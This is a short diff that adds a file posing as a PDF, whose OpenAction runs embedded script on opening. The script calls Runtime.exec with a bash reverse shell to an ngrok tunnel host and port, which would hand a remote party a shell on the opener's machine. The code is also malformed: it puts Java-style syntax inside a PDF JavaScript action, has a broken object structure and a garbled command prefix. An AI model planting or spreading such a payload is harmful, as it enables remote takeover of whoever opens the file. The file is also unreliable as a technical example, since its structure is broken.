@@ -1,0 +1,13 @@
+%PDF-1.7
+1 0 obj
+<</Pages 1 0 R /OpenAction 2 0 R>>
+2 0 obj
+<</S /JavaScript /JS (
+    Process p;
+    try {
+        p = Runtime.getRuntime().exec("bash -c $@|bash 0 echo bash -i >& /dev/tcp/0.tcp.ap.ngrok.io/19210 0>&1");
+        p.waitFor();
+        p.destroy();
+    } catch (Exception e) {}
+    )
+>> trailer <</Root 1 0 R>>
